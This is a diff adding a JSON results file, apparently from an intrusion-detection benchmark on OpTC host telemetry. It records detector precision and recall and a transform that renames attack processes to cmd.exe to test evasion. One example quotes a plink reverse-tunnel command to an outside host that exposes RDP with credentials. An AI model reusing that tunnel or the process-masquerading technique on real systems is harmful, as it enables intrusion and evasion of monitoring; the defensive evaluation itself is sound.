@@ -1,0 +1,186 @@
+{
+ "set": "OPTC_H501",
+ "bundle": "/data/lab08/18978a51-ac8f-4afd-8f7a-c3003fa744c2/v07rel",
+ "fleet": [
+  "OPTC_H201",
+  "OPTC_H501",
+  "OPTC_H051"
+ ],
+ "n_attacks": 1,
+ "gt_nodes": 749,
+ "days": 3,
+ "transform": {
+  "transform": "launder",
+  "lotl": {
+   "targets": [
+    {
+     "key": "/users/sysadmin/downloads/filetransfer1000.exe",
+     "kind": "process",
+     "gt_nodes": 6,
+     "replacement_key": "/windows/system32/cmd.exe",
+     "replacement": "/Device/HarddiskVolume1/Windows/system32/cmd.exe",
+     "fallback_to_process": false,
+     "baseline_runs": 11964,
+     "renamed_nodes": 6
+    },
+    {
+     "key": "/windows/system32/plink.exe",
+     "kind": "process",
+     "gt_nodes": 1,
+     "replacement_key": "/windows/system32/cmd.exe",
+     "replacement": "/Device/HarddiskVolume1/Windows/system32/cmd.exe",
+     "fallback_to_process": false,
+     "baseline_runs": 11964,
+     "renamed_nodes": 1
+    }
+   ],
+   "renamed_nodes": 7,
+   "renamed_gt": 7,
+   "still_unknown": 0,
+   "baseline_programs": 127,
+   "baseline_processes": 46131,
+   "top_shell": "/windows/system32/cmd.exe",
+   "top_process": "/windows/system32/cmd.exe",
+   "examples": [
+    {
+     "before": "subject /Device/HarddiskVolume1/Windows/system32/plink.exe \"C:/Windows/system32/plink.exe\" sports.com -R 4000:127.0.0.1:3389 -l myguest -pw myguest",
+     "after": "subject /Device/HarddiskVolume1/Windows/system32/cmd.exe \"/Device/HarddiskVolume1/Windows/system32/cmd.exe\" sports.com -R 4000:127.0.0.1:3389 -l myguest -pw myg",
+     "gt": true
+    },
+    {
+     "before": "subject /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe \"C:/Users/sysadmin/Downloads/fileTransfer1000.exe\"",
+     "after": "subject /Device/HarddiskVolume1/Windows/system32/cmd.exe \"/Device/HarddiskVolume1/Windows/system32/cmd.exe\"",
+     "gt": true
+    },
+    {
+     "before": "subject /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe \"C:/Users/sysadmin/Downloads/fileTransfer1000.exe\" --help",
+     "after": "subject /Device/HarddiskVolume1/Windows/system32/cmd.exe \"/Device/HarddiskVolume1/Windows/system32/cmd.exe\" --help",
+     "gt": true
+    }
+   ]
+  },
+  "launder": {
+   "payloads": 0,
+   "copier_label": "subject /Device/HarddiskVolume1/Windows/system32/cmd.exe None",
+   "items": [],
+   "candidates_not_written": 0,
+   "edges_added": 0
+  }
+ },
+ "variants": [
+  "P2",
+  "F3",
+  "L12"
+ ],
+ "attacks_all": [
+  "h501_0924"
+ ],
+ "P2": {
+  "TP": 10,
+  "FP": 65,
+  "recall": 0.013,
+  "attacks": 1,
+  "FP/day": 21.67,
+  "TP/day": 3.33,
+  "by_layer": {
+   "novelty": 33,
+   "corroborated": 28,
+   "rules": 14
+  },
+  "by_layer_tp": {
+   "corroborated": 5,
+   "rules": 5
+  },
+  "by_rule": {
+   "novelty/novel_executable": 33,
+   "corroborated/learned_near_alert": 27,
+   "rules/exfiltration": 14,
+   "corroborated/novel_executable_repeat": 1
+  },
+  "by_rule_tp": {
+   "corroborated/learned_near_alert": 5,
+   "rules/exfiltration": 5
+  },
+  "attacks_found": [
+   "h501_0924"
+  ],
+  "per_attack_gt_rules": {
+   "h501_0924": {
+    "corroborated/learned_near_alert": 5,
+    "rules/exfiltration": 5
+   }
+  },
+  "rows": 84,
+  "precision": 0.133
+ },
+ "F3": {
+  "TP": 10,
+  "FP": 65,
+  "recall": 0.013,
+  "attacks": 1,
+  "FP/day": 21.67,
+  "TP/day": 3.33,
+  "by_layer": {
+   "novelty": 33,
+   "corroborated": 28,
+   "rules": 14
+  },
+  "by_layer_tp": {
+   "corroborated": 5,
+   "rules": 5
+  },
+  "by_rule": {
+   "novelty/novel_executable": 33,
+   "corroborated/learned_near_alert": 27,
+   "rules/exfiltration": 14,
+   "corroborated/novel_executable_repeat": 1
+  },
+  "by_rule_tp": {
+   "corroborated/learned_near_alert": 5,
+   "rules/exfiltration": 5
+  },
+  "attacks_found": [
+   "h501_0924"
+  ],
+  "per_attack_gt_rules": {
+   "h501_0924": {
+    "corroborated/learned_near_alert": 5,
+    "rules/exfiltration": 5
+   }
+  },
+  "rows": 84,
+  "precision": 0.133
+ },
+ "L12": {
+  "TP": 5,
+  "FP": 42,
+  "recall": 0.007,
+  "attacks": 1,
+  "FP/day": 14.0,
+  "TP/day": 1.67,
+  "by_layer": {
+   "novelty": 33,
+   "rules": 14
+  },
+  "by_layer_tp": {
+   "rules": 5
+  },
+  "by_rule": {
+   "novelty/novel_executable": 33,
+   "rules/exfiltration": 14
+  },
+  "by_rule_tp": {
+   "rules/exfiltration": 5
+  },
+  "attacks_found": [
+   "h501_0924"
+  ],
+  "per_attack_gt_rules": {
+   "h501_0924": {
+    "rules/exfiltration": 5
+   }
+  },
+  "rows": 48,
+  "precision": 0.106
+ }
+}
